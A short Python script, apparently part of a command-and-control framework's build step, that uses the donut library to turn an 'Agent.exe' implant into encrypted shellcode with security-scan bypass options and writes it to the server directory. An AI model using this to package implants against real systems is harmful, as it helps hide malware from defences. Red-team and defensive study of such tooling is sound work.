import donut

shellcode = donut.gen(
    file="implant/Agent/bin/Release/Agent.exe",
    arch=2,     # x86 / x64 / x86+x64
    bypass=3,   # none / abort / continue
    entropy=3,  # none / random / random+encrypt
    exit_opt=1, # thread / process
    output="server/agent.bin"        
)